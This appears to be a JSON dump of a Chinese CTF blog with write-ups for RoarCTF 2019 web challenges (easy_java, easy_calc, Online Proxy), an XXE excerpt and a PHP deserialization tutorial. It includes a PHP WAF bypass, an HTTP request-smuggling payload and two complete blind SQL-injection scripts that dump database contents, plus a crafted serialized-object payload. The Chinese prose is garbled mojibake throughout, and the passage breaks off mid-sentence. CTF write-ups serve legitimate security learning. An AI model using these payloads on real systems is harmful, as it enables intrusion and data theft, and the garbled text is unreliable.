å‘ç°æ“ä½œflagçš„å…³é”®é…ç½®</p>\n<p>æŒ‰ç…§æ˜ å°„å…³ç³»è®¿é—® <code>filename=WEB-INF/classes/com/wm/ctf/FlagController.class</code> å³å¯å¾—åˆ°è§£å¯†çš„å­—ç¬¦ä¸²ï¼Œbase64è§£å¯†å³å¯</p>\n<h2 id=\"easy-calc\"><a href=\"#easy-calc\" class=\"headerlink\" title=\"easy_calc\"></a>easy_calc</h2><p>å³é”®æŸ¥çœ‹æºç </p>\n<pre><code>&lt;?php\nerror_reporting(0);\nif(!isset($_GET[&apos;num&apos;])){\n    show_source(__FILE__);\n}else{\n        $str = $_GET[&apos;num&apos;];\n        $blacklist = [&apos; &apos;, &apos;\\t&apos;, &apos;\\r&apos;, &apos;\\n&apos;,&apos;\\&apos;&apos;, &apos;&quot;&apos;, &apos;`&apos;, &apos;\\[&apos;, &apos;\\]&apos;,&apos;\\$&apos;,&apos;\\\\&apos;,&apos;\\^&apos;];\n        foreach ($blacklist as $blackitem) {\n                if (preg_match(&apos;/&apos; . $blackitem . &apos;/m&apos;, $str)) {\n                        die(&quot;what are you want to do?&quot;);\n                }\n        }\n        eval(&apos;echo &apos;.$str.&apos;;&apos;);\n}\n?&gt; </code></pre><p>æœ‰wafï¼Œè¿™é‡Œæœ‰ä¸¤ç§æ–¹æ³•ç»•è¿‡ï¼š</p>\n<ol>\n<li>åˆ©ç”¨å­—ç¬¦ä¸²è§£æç‰¹æ€§ Bypass</li>\n</ol>\n<p>åŸç†çœ‹è¿™ç¯‡æ–‡ç« ï¼š<br><a href=\"https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/\" target=\"_blank\" rel=\"noopener\">https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/</a></p>\n<p>è¿™é‡Œè¯´ä¸€ä¸‹å¤§æ¦‚æ„æ€<br> PHP å¤„ç† GET or POST è¯·æ±‚æ—¶å°†æŸ¥è¯¢å­—ç¬¦ä¸²è½¬æ¢æˆæ•°ç»„ <code>/?foo=bar becomes Array([foo] =&gt; &quot;bar&quot;)</code> ã€‚å‚æ•°åé‡Œçš„ä¸€äº›å­—ç¬¦ä¼šè¢«ç§»é™¤æˆ–æ›¿æ¢æˆä¸‹åˆ’çº¿ <code>/?%20news[id%00=42 will be converted to Array([news_id] =&gt; 42)</code> å¦‚æœWAFè§„åˆ™æ˜¯å‚æ•°é‡Œå«æœ‰ä¸€ä¸ªéæ•°å€¼å‹çš„å€¼æ—¶è¿›è¡Œæ‹¦æˆªæ—¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç”¨ä¸‹åˆ—è¯­å¥ç»•è¿‡<code>/news.php?%20news[id%00=42&quot;+AND+1=0--</code> å®ƒä¼šè¢«å­˜å‚¨åœ¨ <code>$_GET[&quot;news_id&quot;]</code> ã€‚</p>\n<p>è¿™æ˜¯æµ‹è¯•phpæ˜¯å¦‚ä½•å¤„ç†ç‰¹æ®Šå­—ç¬¦ï¼š</p>\n<pre><code>&lt;?php\nforeach(\n    [\n        &quot;{chr}foo_bar&quot;,\n        &quot;foo{chr}bar&quot;,\n        &quot;foo_bar{chr}&quot;\n    ] as $k =&gt; $arg) {\n    for($i=0;$i&lt;=255;$i++) {\n        echo &quot;\\033[999D\\033[K\\r&quot;;\n        echo &quot;[&quot;.$arg.&quot;] check &quot;.bin2hex(chr($i)).&quot;&quot;;\n        parse_str(str_replace(&quot;{chr}&quot;,chr($i),$arg).&quot;=bla&quot;,$o);\n        /* yes... I&apos;ve added a sleep time on each loop just for\n        the scenic effect :)\nlike that movie with unrealistic\n        brute-force where the password are obtained\n        one byte at a time (âˆ©ï½€-Â´)âŠƒâ”â˜†ï¾Ÿ.*ï½¥ï½¡ï¾Ÿ\n        */\n        usleep(5000);\n        if(isset($o[&quot;foo_bar&quot;])) {\n            echo &quot;\\033[999D\\033[K\\r&quot;;\n            echo $arg.&quot; -&gt; &quot;.bin2hex(chr($i)).&quot; (&quot;.chr($i).&quot;)\\n&quot;;\n        }\n    }\n    echo &quot;\\033[999D\\033[K\\r&quot;;\n    echo &quot;\\n&quot;;\n}</code></pre><p>è¿™é“é¢˜ç›®ç»è¿‡æµ‹è¯•å‚æ•°å‰åŠ ä¸€ä¸ª <code>%20</code>æˆ–è€… <code>+</code> æ¥ç»•è¿‡</p>\n<ol start=\"2\">\n<li>httpåè®®èµ°ç§æ”»å‡»</li>\n</ol>\n<blockquote>\n<p>å½“æˆ‘ä»¬å‘ä»£ç†æœåŠ¡å™¨å‘é€ä¸€ä¸ªæ¯”è¾ƒæ¨¡ç³Šçš„HTTPè¯·æ±‚æ—¶ï¼Œç”±äºä¸¤è€…æœåŠ¡å™¨çš„å®ç°æ–¹å¼ä¸åŒï¼Œå¯èƒ½ä»£ç†æœåŠ¡å™¨è®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªHTTPè¯·æ±‚ï¼Œç„¶åå°†å…¶è½¬å‘ç»™äº†åç«¯çš„æºç«™æœåŠ¡å™¨ï¼Œä½†æºç«™æœåŠ¡å™¨ç»è¿‡è§£æå¤„ç†åï¼Œåªè®¤ä¸ºå…¶ä¸­çš„ä¸€éƒ¨åˆ†ä¸ºæ­£å¸¸è¯·æ±‚ï¼Œå‰©ä¸‹çš„é‚£ä¸€éƒ¨åˆ†ï¼Œå°±ç®—æ˜¯èµ°ç§çš„è¯·æ±‚ï¼Œå½“è¯¥éƒ¨åˆ†å¯¹æ­£å¸¸ç”¨æˆ·çš„è¯·æ±‚é€ æˆäº†å½±å“ä¹‹åï¼Œå°±å®ç°äº†HTTPèµ°ç§æ”»å‡»ã€‚</p>\n</blockquote>\n<p>è¿™é‡Œæˆ‘ä»¬é€šè¿‡ CL-CL æ¥Bypass</p>\n<pre><code>POST /calc.php?num=phpinfo() HTTP/1.1\nHost: ********\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0\nAccept: */*\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nX-Requested-With: XMLHttpRequest\nConnection: keep-alive\nReferer: **********\nCookie: __cfduid=***********\nX-Forwarded-For: 127.0.0.1\nContent-Length: 7\nContent-Length: 7\nContent-Type: application/x-www-form-urlencoded\n\nnum=111</code></pre><p>ç»•è¿‡wafä¹‹åè¿˜ç¦æ‰äº†ä¸€äº›å­—ç¬¦ä¸èƒ½ç›´æ¥è¯»åˆ° flag ã€‚</p>\n<p>å…ˆå­¦ä¹ å‡ ä¸ªå‡½æ•°</p>\n<ul>\n<li>ord â€” è¿”å›å­—ç¬¦çš„ ASCII ç å€¼</li>\n<li>bin2hex â€” å‡½æ•°æŠŠåŒ…å«æ•°æ®çš„äºŒè¿›åˆ¶å­—ç¬¦ä¸²è½¬æ¢ä¸ºåå…­è¿›åˆ¶å€¼</li>\n<li>hex2bin â€” è½¬æ¢åå…­è¿›åˆ¶å­—ç¬¦ä¸²ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²</li>\n<li>dechex â€” åè¿›åˆ¶è½¬æ¢ä¸ºåå…­è¿›åˆ¶</li>\n<li>base_convert â€” åœ¨ä»»æ„è¿›åˆ¶ä¹‹é—´è½¬æ¢æ•°å­—</li>\n<li>hexdec â€” åå…­è¿›åˆ¶è½¬æ¢ä¸ºåè¿›åˆ¶</li>\n</ul>\n<p>è¯»å–flag</p>\n<pre><code>?+num=file_get_contents(hex2bin(dechex(52115961636711)))</code></pre><h2 id=\"Online-Proxy\"><a href=\"#Online-Proxy\" class=\"headerlink\" title=\"Online Proxy\"></a>Online Proxy</h2><p>æ‰“å¼€é¶æœºï¼ŒæŠ“åŒ…å‘ç°å“åº”å¤´</p>\n<pre><code>&lt;!-- Debug Info: \n Duration: 0.058279037475586 s \n Current Ip: 127.0.0.1 </code></pre><p>åœ¨ XFF å¤„å°è¯•ä¿®æ”¹å†…å®¹ï¼Œå‘ç°å¯ä»¥ä¿®æ”¹æˆåŠŸã€‚<code>Current Ip</code> å¤„æ˜¾ç¤ºå½“å‰çš„ XFFå€¼ï¼Œ<code>Last Ip</code> æ˜¾ç¤ºä¸Šæ¬¡æŸ¥è¯¢å†…å®¹ã€‚æ‰§è¡Œ sleep() è¯­å¥ <code>1&#39; and sleep(3) and 1=&#39;1</code> å‘ç°åœ¨ç¬¬äºŒæ¬¡è¿›è¡Œä¿®æ”¹å‘åŒ…ä¹‹åæˆåŠŸæ‰§è¡Œï¼Œå­˜åœ¨äºŒæ¬¡æ³¨å…¥ã€‚</p>\n<p>æ‰€è°“äºŒæ¬¡æ³¨å…¥å°±æ˜¯æœåŠ¡ç«¯åœ¨ç¬¬ä¸€æ¬¡æ¥æ”¶è„æ•°æ®æ—¶å¯¹æ•°æ®è¿›è¡Œäº† <code>addslashes</code> æˆ– <code>mysql_escape_string</code>  å¤„ç†ï¼Œä½†æ˜¯å­˜å…¥æ•°æ®åº“æ—¶å­˜çš„è¿˜æ˜¯è„æ•°æ®ï¼Œäºæ˜¯åœ¨ç¬¬äºŒæ¬¡æŸ¥è¯¢æ—¶ç”±äºæŸ¥è¯¢çš„æ˜¯è„æ•°æ®ï¼Œä¿¡æ¯ä»ç„¶ä¼šæ³„éœ²ã€‚</p>\n<p>æŸ¥çœ‹æºç ï¼š</p>\n<pre><code>header(&quot;Content-type: &quot;. $mime_type.&quot;; charset=UTF-8&quot;);\n$content = str_replace(&quot;&lt;a href=\\&quot;&quot;, &quot;&lt;a href=\\&quot;/?url=&quot;, $content);\n$content = str_replace(&quot;&lt;a href=&apos;&quot;, &quot;&lt;a href=&apos;/?url=&quot;, $content);\necho($content);\n$end = microtime(true);\n$time = $end - $start;\n$last_ip = &quot;&quot;;\n$result = query(&quot;select current_ip, last_ip from ip_log where uuid = &apos;&quot;.addslashes($uuid).&quot;&apos;&quot;);\nif(count($result) &gt; 0) {\n    if($ip !== $result[0][&apos;current_ip&apos;]) {\n        $last_ip = $result[0][&apos;current_ip&apos;];\n        query(&quot;delete from ip_log where uuid=&apos;&quot;.addslashes($uuid).&quot;&apos;&quot;);\n    } else {\n        $last_ip = $result[0][&apos;last_ip&apos;];\n    }\n}\nquery(&quot;insert into ip_log values (&apos;&quot;.addslashes($uuid).&quot;&apos;, &apos;&quot;.addslashes($ip).&quot;&apos;, &apos;$last_ip&apos;);&quot;);\ndie(&quot;\\n&lt;!-- Debug Info: \\n Duration: $time s \\n Current Ip: $ip &quot;.($last_ip !== &quot;&quot; ? &quot;\\nLast Ip: &quot;.$last_ip : &quot;&quot;).&quot; --&gt;&quot;);</code></pre><p>å¯ä»¥çœ‹åˆ°åœ¨æŸ¥è¯¢åˆ°æ•°æ®ä¹‹åï¼Œå¦‚æœ <code>$ip !== $result[0][&#39;current_ip&#39;]</code> é‚£ä¹ˆ <code>$last_ip = $result[0][&#39;current_ip&#39;];</code> ï¼Œéšåå°† last_ip ä¸å¸¦è¿‡æ»¤çš„å¸¦å…¥æ•°æ®åº“ä¸­æŸ¥è¯¢ã€‚</p>\n<p>æ‰€ä»¥æˆ‘ä»¬æ³¨å…¥çš„æ€è·¯å°±æ˜¯å…ˆå°† exp æ’å…¥æ•°æ®ï¼Œç„¶åå†æ­£å¸¸è®¿é—®ä¸€æ¬¡å°†æ•°æ®å¸¦å‡ºã€‚</p>\n<p>exp:</p>\n<pre><code>import requests\nfrom time import sleep\nurl = &quot;http://node3.buuoj.cn:28063/&quot;\ns = requests.session()\n\nre = s.get(url)\nname = &apos;&apos;\n&quot;&quot;&quot;\n# database name\n# current db : ctf\n# information_schema,test,mysql,ctftraining,performance_schema,F4l9_D4t4B45e,ctf\nfor i in range(1,100):\n    print &apos;[+]: &apos;,i\n    for j in range(33,128):\n        sleep(0.01)\n        headers1 = {\n&quot;X-Forwarded-For&quot;: &apos;1&apos;\n}\n        headers2 = {\n    &quot;X-Forwarded-For&quot;:&quot;1&apos; and if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),{},1))={} ,sleep(3),0) and 1=&apos;1&quot;.format(i,j)\n}\n        re1 = s.get(url,headers = headers2)\n        try:\n            re2 = s.get(url,headers=headers1,timeout=2)\n        except Exception as e:\n            print &quot;[-]: &quot;+str(e)\n            name += chr(j)\n            print name\n            break\n&quot;&quot;&quot;\n&quot;&quot;&quot;\n# table name\n# ctf : ip_log\n# F4l9_D4t4B45e : F4l9_t4b1e\nfor i in range(1,100):\n    print &apos;[+]: &apos;,i\n    for j in range(33,128):\n        sleep(0.01)\n        headers1 = {\n&quot;X-Forwarded-For&quot;: &apos;1&apos;\n}\n        headers2 = {\n    &quot;X-Forwarded-For&quot;:&quot;1&apos; and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&apos;F4l9_D4t4B45e&apos;),{},1))={} ,sleep(3),0) and 1=&apos;1&quot;.format(i,j)\n}\n        re1 = s.get(url,headers = headers2)\n        try:\n            re2 = s.get(url,headers=headers1,timeout=2)\n        except Exception as e:\n            #print &quot;[-]: &quot;+str(e)\n            name += chr(j)\n            print name\n            break\n&quot;&quot;&quot;\n&quot;&quot;&quot;\n# column_name\n# F4l9_D4t4B45e.F4l9_t4b1e : F4l9_C01uMn\nfor i in range(1,20):\n    print &apos;[+]: &apos;,i\n    for j in range(33,128):\n        sleep(0.01)\n        headers1 = {\n&quot;X-Forwarded-For&quot;: &apos;1&apos;\n}\n        headers2 = {\n    &quot;X-Forwarded-For&quot;:&quot;1&apos; and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=&apos;F4l9_D4t4B45e&apos;and table_name=&apos;F4l9_t4b1e&apos;),{},1))={} ,sleep(3),0) and 1=&apos;1&quot;.format(i,j)\n}\n        re1 = s.get(url,headers = headers2)\n        try:\n            re2 = s.get(url,headers=headers1,timeout=2)\n        except Exception as e:\n            #print &quot;[-]: &quot;+str(e)\n            name += chr(j)\n            print name\n            break\n&quot;&quot;&quot;\nfor i in range(1,100):\n    print &apos;[+]: &apos;,i\n    for j in range(33,128):\n        sleep(0.01)\n        headers1 = {\n&quot;X-Forwarded-For&quot;: &apos;1&apos;\n}\n        headers2 = {\n    &quot;X-Forwarded-For&quot;:&quot;1&apos; and if(ascii(substr((select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e),{},1))={} ,sleep(3),0) and 1=&apos;1&quot;.format(i,j)\n}\n        re1 = s.get(url,headers = headers2)\n        try:\n            re2 = s.get(url,headers=headers1,timeout=2)\n        except Exception as e:\n            #print &quot;[-]: &quot;+str(e)\n            name += chr(j)\n            print name\n            break</code></pre><p>è¿™ä¸ªå¤ªä¸ä¼˜é›…äº†ï¼Œèµµå¸ˆå‚…çš„æ›´ä¼˜é›…ï¼š</p>\n<pre><code>#!/usr/bin/env python3\n\nimport requests\n\ntarget = &quot;http://localhost:8302/&quot;\n\ndef execute_sql(sql):\n    print(&quot;[*]è¯·æ±‚è¯­å¥ï¼š&quot; + sql)\n    return_result = &quot;&quot;\n\n    payload = &quot;0&apos;|length((&quot; + sql + &quot;))|&apos;0&quot;\n    session = requests.session()\n    r = session.get(target, headers={&apos;X-Forwarded-For&apos;: payload})\n    r = session.get(target, headers={&apos;X-Forwarded-For&apos;: &apos;glzjin&apos;})\n    r = session.get(target, headers={&apos;X-Forwarded-For&apos;: &apos;glzjin&apos;})\n    start_pos = r.text.find(&quot;Last Ip: &quot;)\n    end_pos = r.text.find(&quot; --&gt;&quot;, start_pos)\n    length = int(r.text[start_pos + 9: end_pos])\n    print(&quot;[+]é•¿åº¦ï¼š&quot; + str(length))\n\n    for i in range(1, length + 1, 5):\n        payload = &quot;0&apos;|conv(hex(substr((&quot; + sql + &quot;),&quot; + str(i) + &quot;,5)),16,10)|&apos;0&quot;\n\n        r = session.get(target, headers={&apos;X-Forwarded-For&apos;: payload})\n        r = session.get(target, headers={&apos;X-Forwarded-For&apos;: &apos;glzjin&apos;})\n        r = session.get(target, headers={&apos;X-Forwarded-For&apos;: &apos;glzjin&apos;})\n        start_pos = r.text.find(&quot;Last Ip: &quot;)\n        end_pos = r.text.find(&quot; --&gt;&quot;, start_pos)\n        result = int(r.text[start_pos + 9: end_pos])\n        return_result += bytes.fromhex(hex(result)[2:]).decode(&apos;utf-8&apos;)\n\n        print(&quot;[+]ä½ç½® &quot; + str(i) + &quot; è¯·æ±‚äº”ä½æˆåŠŸ:&quot; + bytes.fromhex(hex(result)[2:]).decode(&apos;utf-8&apos;))\n\n    return return_result\n\n\n# è·å–æ•°æ®åº“\nprint(&quot;[+]è·å–æˆåŠŸï¼š&quot; + execute_sql(&quot;SELECT group_concat(SCHEMA_NAME) FROM information_schema.SCHEMATA&quot;))\n\n# è·å–æ•°æ®åº“è¡¨\nprint(&quot;[+]è·å–æˆåŠŸï¼š&quot; + execute_sql(&quot;SELECT group_concat(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA = &apos;F4l9_D4t4B45e&apos;&quot;))\n\n# è·å–æ•°æ®åº“è¡¨\nprint(&quot;[+]è·å–æˆåŠŸï¼š&quot; + execute_sql(&quot;SELECT group_concat(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = &apos;F4l9_D4t4B45e&apos; AND TABLE_NAME = &apos;F4l9_t4b1e&apos; &quot;))\n\n# è·å–è¡¨ä¸­å†…å®¹\nprint(&quot;[+]è·å–æˆåŠŸï¼š&quot; + execute_sql(&quot;SELECT group_concat(F4l9_C01uMn) FROM F4l9_D4t4B45e.F4l9_t4b1e&quot;))</code></pre><p>è¿™é‡Œç”¨çš„æ˜¯ <code>1&#39;|&#39;1&#39;|&#39;1</code> ç„¶åå¼‚æˆ–ä¹Ÿå¯ä»¥ <code>1&#39;^&#39;0&#39;^&#39;1</code></p>\n<h2 id=\"å‚è€ƒé“¾æ¥\"><a href=\"#å‚è€ƒé“¾æ¥\" class=\"headerlink\" title=\"å‚è€ƒé“¾æ¥\"></a>å‚è€ƒé“¾æ¥</h2><blockquote>\n<p><a href=\"https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/\" target=\"_blank\" rel=\"noopener\">https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/</a></p>\n<p><a href=\"https://www.freebuf.com/articles/web/213359.html\" target=\"_blank\" rel=\"noopener\">https://www.freebuf.com/articles/web/213359.html</a></p>\n<p><a href=\"https://paper.seebug.org/1048/#32-cl-cl\" target=\"_blank\" rel=\"noopener\">https://paper.seebug.org/1048/#32-cl-cl</a></p>\n</blockquote>\n","text":"roarctf 201910/16/2019 4:45:49 PM easy_javaæ‹¿åˆ°é¢˜ç›®çœ‹åˆ°æ–‡ä»¶ä¸‹è½½çš„æ¥å£ï¼Œå°è¯• /Download?filename=help.docx ,å‘ç°æ²¡æ³•ä¸‹è½½ï¼Œå°è¯•ä¸‹è½½ç½‘é¡µä¸Šçš„ç…§ç‰‡å‘ç°ä¹Ÿä¸‹è½½ä¸äº†ï¼Œåæ¥å°±è·‘åäº†ï¼Œåœ¨æƒ³ä¼šä¸ä¼šæ˜¯ SSTI ?fuzzäº†","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"wp","slug":"wp","count":3,"path":"api/tags/wp.json"}]},{"title":"xxe","slug":"xxe","date":"2019-08-17T07:23:51.000Z","updated":"2019-09-03T14:20:16.807Z","comments":true,"path":"api/articles/xxe.json","excerpt":"<p>ä¸€æ¬¡ç®€å•çš„xxeå­¦ä¹ ~</p>","keywords":null,"cover":"https://xzfile.aliyuncs.com/media/upload/picture/20181120002647-e93bbf00-ec17-1.png","content":null,"text":"ä¸€æ¬¡ç®€å•çš„xxeå­¦ä¹ ~XXEå®šä¹‰å®ä½“&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTIT","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"xxe","slug":"xxe","count":1,"path":"api/tags/xxe.json"}]},{"title":"åºåˆ—åŒ–ä¸ååºåˆ—åŒ–","slug":"åºåˆ—åŒ–ä¸ååºåˆ—åŒ–","date":"2019-12-12T03:47:20.000Z","updated":"2020-05-05T06:02:50.440Z","comments":true,"path":"api/articles/åºåˆ—åŒ–ä¸ååºåˆ—åŒ–.json","excerpt":"","keywords":null,"cover":"https://i.imgur.com/pBO7lBu.png","content":"<h1 id=\"åºåˆ—åŒ–ä¸ååºåˆ—åŒ–\"><a href=\"#åºåˆ—åŒ–ä¸ååºåˆ—åŒ–\" class=\"headerlink\" title=\"åºåˆ—åŒ–ä¸ååºåˆ—åŒ–\"></a>åºåˆ—åŒ–ä¸ååºåˆ—åŒ–</h1><h2 id=\"0x01ä¸ºä»€ä¹ˆè¦åºåˆ—åŒ–\"><a href=\"#0x01ä¸ºä»€ä¹ˆè¦åºåˆ—åŒ–\" class=\"headerlink\" title=\"0x01ä¸ºä»€ä¹ˆè¦åºåˆ—åŒ–\"></a>0x01ä¸ºä»€ä¹ˆè¦åºåˆ—åŒ–</h2><p>phpå…è®¸ä¿å­˜ä¸€ä¸ªå¯¹è±¡æ–¹ä¾¿ä»¥åé‡ç”¨ï¼Œè¿™ä¸ªè¿‡ç¨‹ç§°ä¸ºåºåˆ—åŒ–ã€‚åœ¨ä¼ é€’å˜é‡çš„è¿‡ç¨‹ä¸­æœ‰å¯èƒ½é‡åˆ°å˜é‡å€¼è·¨è„šæœ¬ä¼ è¾“çš„è¿‡ç¨‹ã€‚æ¯”å¦‚æ–‡ä»¶ç»“æ„æ˜¯è¿™æ ·çš„ï¼š</p>\n<p><img src=\"https://i.imgur.com/pBO7lBu.png\" alt></p>\n<p>å…¶ä¸­index.phpä»£ç å¦‚ä¸‹ï¼š</p>\n<pre><code>&lt;?php \n@highlight_file(__FILE__);\nrequire_once(&apos;shield.php&apos;);\n$x = new Shield();\nisset($_GET[&apos;class&apos;]) &amp;&amp; $g = $_GET[&apos;class&apos;];\nif (!empty($g)) {\n    $x = unserialize($g);\n}\necho $x-&gt;readfile();\n?&gt;</code></pre><p>å¯ä»¥çœ‹å‡ºæ¥$xå°±æ˜¯è·¨è„šæœ¬ä¼ è¾“çš„å˜é‡ã€‚</p>\n<p>å¦‚æœåœ¨ä¸€ä¸ªè„šæœ¬è°ƒç”¨è·¨è„šæœ¬ä¼ è¾“çš„å˜é‡ä¹‹å‰ï¼Œå‰ä¸€ä¸ªåŒ…å«è¯¥å˜é‡çš„è„šæœ¬å·²ç»æ‰§è¡Œç»“æŸæ‰€æœ‰çš„å˜é‡å’Œå†…å®¹éƒ½å·²ç»é‡Šæ”¾æ‰äº†ï¼Œè¿™æ—¶ï¼Œæˆ‘ä»¬ä¸èƒ½è®©å‰ä¸€ä¸ªè„šæœ¬ä¸æ–­å¾ªç¯æ‰§è¡Œç­‰å¾…åé¢çš„è„šæœ¬å»è°ƒç”¨ã€‚serializeå’Œunserialize å°±æ˜¯è§£å†³è¿™ä¸€é—®é¢˜çš„ã€‚serializeå°†å˜é‡è½¬æ¢ä¸ºå­—ç¬¦ä¸²å¹¶ä¸”åœ¨è½¬æ¢è¿‡ç¨‹ä¸­ä¿å­˜å½“å‰å˜é‡çš„å€¼;unserializeåˆ™å°†serializeç”Ÿæˆçš„å­—ç¬¦ä¸²å˜å›æˆå˜é‡ã€‚</p>\n<p>çœ‹ä¸€ä¸ªä¾‹å­ï¼Œç®€å•çš„åˆ†æä¸€ä¸‹ï¼š</p>\n<pre><code>&lt;?php\nclass Test\n{\npublic $age = 0;\npublic $name = &apos;brain&apos;;\n\npublic function PrintInfo()\n{\n    echo &apos;[+]User: &apos;.$this-&gt;name .&apos;: is&apos; . $this-&gt;age .&apos;years old.&apos;;\n}\n}\n$user =  new Test();\n$user-&gt;age = 20;\n$user-&gt;name = &apos;Jack&apos;;\n$user-&gt;PrintInfo();\necho serialize($user);\n\n?&gt;</code></pre><p>è¾“å‡ºç»“æœå¦‚ä¸‹</p>\n<p><img src=\"https://i.imgur.com/bqenWI4.png\" alt></p>\n<p>ä½¿ç”¨unserializeåˆ™ä¼šä½¿è¿™ä¸²<strong>å­—ç¬¦ä¸²</strong>æ¢å¤æˆ<strong>ç±»å¯¹è±¡</strong>ã€‚</p>\n<h2 id=\"é­”æ³•å‡½æ•°\"><a href=\"#é­”æ³•å‡½æ•°\" class=\"headerlink\" title=\"é­”æ³•å‡½æ•°\"></a>é­”æ³•å‡½æ•°</h2><p>ä¸€å…±æœ‰å‡ ä¸ªé­”æ³•å‡½æ•°éœ€è¦æ³¨æ„ï¼Œè¿™æ˜¯ä¾‹å­ï¼š</p>\n<pre><code>&lt;?php\nclass Test\n{\npublic $variable = &quot;BRAIN&quot;;\npublic $variable1 = &quot;BRAVO&quot;;\npublic function PrintVariable()\n{\n    echo $this-&gt;variable . &apos;&lt;br /&gt;&apos;;\n}\npublic function __construct()\n{\n    echo &apos;__construct&apos;.&apos;&lt;br&gt;&apos;;\n}\npublic function __destruct()\n{\n    echo &apos;__destruct&lt;br /&gt;&apos;;\n}\npublic function __wakeup()\n{\n    echo &apos;__wakeup&lt;br /&gt;&apos;;\n}\npublic function __sleep()\n{\n    echo &apos;__sleep&lt;br /&gt;&apos;;\n    return array(&apos;variable&apos; , &apos;variable1&apos;);\n}\n}    \n$obj = new Test();  //åˆ›å»ºå¯¹è±¡æ—¶è°ƒç”¨__construct\n\n$serialized = serialize($obj); //åºåˆ—åŒ–å¯¹è±¡æ—¶è°ƒç”¨__sleep\n\nprint(&apos;Serialized: &apos;.$serialized . &apos;&lt;br /&gt;&apos;);\n\n$obj2 = unserialize($serialized); //é‡å»ºå¯¹è±¡è°ƒç”¨ __wakeup\n\n$obj2-&gt;PrintVariable(); //è°ƒç”¨æ–¹æ³•è¾“å‡ºæ•°æ®\n//è„šæœ¬ç»“æŸè°ƒç”¨__destruct\n?&gt;</code></pre><p>è¿™æ˜¯æ‰§è¡Œç»“æœï¼š</p>\n<p><img src=\"https://i.imgur.com/Eb6Ax4I.png\" alt></p>\n<p>å¯ä»¥çœ‹åˆ°å„ä¸ªå‡½æ•°çš„æ‰§è¡Œé¡ºåºã€‚</p>\n<h2 id=\"æ¼æ´äº§ç”Ÿ\"><a href=\"#æ¼æ´äº§ç”Ÿ\" class=\"headerlink\" title=\"æ¼æ´äº§ç”Ÿ\"></a>æ¼æ´äº§ç”Ÿ</h2><p>ååºåˆ—åŒ–çš„å±å®³å°±åœ¨äºååºåˆ—åŒ–åçš„å­—ç¬¦ä¸²å‚æ•°è¢«ç”¨æˆ·å¯æ§ï¼Œä»è€Œåœ¨åºåˆ—åŒ–ä¹‹åé€ æˆä¸å¯é¢„æ–™çš„é—®é¢˜ã€‚</p>\n<p>æ‹¿ä¸€é“ctfé¢˜ä¸¾ä¾‹ï¼Œæ–‡ä»¶ç»“æ„å°±æ˜¯æ–‡ç« å¼€å¤´æåˆ°çš„ç»“æ„</p>\n<pre><code>    idnex.php\n\n&lt;?php \n@highlight_file(__FILE__);\nrequire_once(&apos;shield.php&apos;);\n$x = new Shield();\nisset($_GET[&apos;class&apos;]) &amp;&amp; $g = $_GET[&apos;class&apos;];\nif (!empty($g)) {\n    $x = unserialize($g);\n}\necho $x-&gt;readfile();\n?&gt;\n\n\nshield.php\n\n&lt;?php\n//flag is in pctf.php\nclass Shield {\n    public $file;\n    function __construct($filename = &apos;&apos;) {\n        $this -&gt; file = $filename;\n    }\n    function readfile() {\n        if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&apos;..&apos;)===FALSE  \n        &amp;&amp; stripos($this-&gt;file,&apos;/&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;\\\\&apos;)==FALSE) {\n            return @file_get_contents($this-&gt;file);\n        }\n    }\n}\n?&gt;</code></pre><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°index.phpä¸­å…ˆåŒ…å«äº†shield.phpï¼Œç„¶ååˆ›å»ºäº†ä¸€ä¸ªæ–°å¯¹è±¡ï¼Œåœ¨åˆ¤æ–­å®Œgetçš„å˜é‡ä¹‹åè¿›è¡Œååºåˆ—åŒ–ï¼Œéšåè°ƒç”¨readfile()å‡½æ•°ã€‚<br>åœ¨shield.phpä¸­æç¤ºflagåœ¨pctf.phpä¸­ï¼Œéšååœ¨readfile()å‡½æ•°ä¸­å¯¹$fileè¿›è¡Œä¸€å®šè¿‡æ»¤ä¹‹åè¯»æ–‡ä»¶å†…å®¹ã€‚</p>\n<p>æˆ‘ä»¬çš„æƒ³æ³•å°±æ˜¯æ§åˆ¶$fileçš„å€¼ä¸ºpctf.php</p>\n<pre><code>&lt;?php\n//flag is in pctf.php\nclass Shield {\n    public $file;\n    function __construct($filename = &apos;&apos;) {\n        $this -&gt; file = $filename;\n    }\n    function readfile() {\n        if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&apos;..&apos;)===FALSE  \n        &amp;&amp; stripos($this-&gt;file,&apos;/&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;\\\\&apos;)==FALSE) {\n            return @file_get_contents($this-&gt;file);\n        }\n    }\n}\n$a = new Shield(&quot;pctf.php&quot;);\necho serialize($a);\n?&gt;\nåºåˆ—åŒ–ç»“æœ\nO:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</code></pre><p>ç„¶åæˆ‘ä»¬å°±å¯ä»¥å°è¯•ä¼ 